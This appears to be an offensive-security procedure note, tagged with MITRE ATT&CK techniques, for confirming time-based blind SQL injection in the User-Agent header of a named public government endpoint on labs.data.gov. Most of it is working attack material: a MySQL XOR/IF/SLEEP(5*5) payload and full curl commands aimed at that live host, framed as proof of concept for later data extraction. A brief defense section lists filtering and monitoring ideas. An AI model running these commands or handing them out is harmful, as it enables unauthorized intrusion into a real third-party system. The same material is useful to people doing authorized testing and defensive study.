---
id: proc-25s-delay
tags:
  - sqli
  - blind-sqli
  - time-based
  - mysql
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/curl-inject-25s-payload]]'
  - '[[commands/sql-payload-25s-sleep]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:10.349Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Confirm-SQLi-with-25-Second-Delay

## Summary

This procedure injects a time-based blind SQL injection payload into the User-Agent header of a request to the /dashboard/datagov/csv_to_json endpoint, using a MySQL SLEEP function with arithmetic (5*5=25) to cause a 25-second server delay, confirming the vulnerability's exploitability.

## Description

The endpoint at labs.data.gov processes the User-Agent header without sanitization, allowing it to be concatenated into SQL queries against a MySQL database. By injecting a conditional XOR IF statement with SLEEP, an attacker can force the server to pause if the injection succeeds, enabling blind inference of database behavior through timing. This step establishes the baseline for delay-based confirmation in a public-facing web application.

## Requirements

1. Network access to https://labs.data.gov (public internet)
2. Tool capable of sending custom HTTP headers (e.g., curl)
3. Timeout settings to handle 30+ second responses
4. Knowledge of MySQL time functions like now() and sysdate()

## Defense

Defensive measures and detection strategies:

- Implement input sanitization or parameterized queries for all headers in SQL construction
- Use web application firewalls (WAF) to detect anomalous User-Agent strings containing SQL keywords like XOR, IF, SLEEP
- Monitor server response times for unusual delays correlating with specific requests
- Log and analyze HTTP headers for injection patterns

## Objectives

1. Verify SQL injection point in User-Agent header
2. Confirm execution of arbitrary SQL via time delay
3. Establish proof-of-concept for further exploitation like data extraction

## Instructions

### Step 1: Prepare and Send Injection Payload

**Context**: Craft the payload to conditionally trigger a 25-second sleep if the current time equals the system date, which is typically true, injecting it into the User-Agent to alter the SQL query.

**Command** ([[commands/sql-payload-25s-sleep]]):
```sql
XOR(if(now()=sysdate(),sleep(5*5),0))OR
```

> This MySQL payload uses XOR for boolean logic and IF to execute SLEEP(25) if now()=sysdate(), causing a delay if injected successfully.

**Command** ([[commands/curl-inject-25s-payload]]):
```bash
curl -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR'" -H "Referer: 1" -H "X-Forwarded-For: 1" -H "X-Requested-With: XMLHttpRequest" -H "Accept-Encoding: gzip,deflate" -H "Accept: */*" --connect-timeout 30 https://labs.data.gov/dashboard/datagov/csv_to_json
```

> Sends the GET request with the payload; expect a 25-second delay before response if vulnerable.

### Step 2: Validate Delay

**Context**: Time the response to confirm the injection caused the server to execute the SLEEP function.

**Command** (use curl with verbose timing):
```bash
curl -w "%{time_total}s" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR'" -H "Referer: 1" --connect-timeout 30 https://labs.data.gov/dashboard/datagov/csv_to_json
```

> The %{time_total} outputs total time; success if >25 seconds.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques

-

## Commands Used

- [[commands/curl-inject-25s-payload]]
- [[commands/sql-payload-25s-sleep]]

## Tools Used

-

## Tags

- sqli
- blind-sqli
- time-based
- mysql
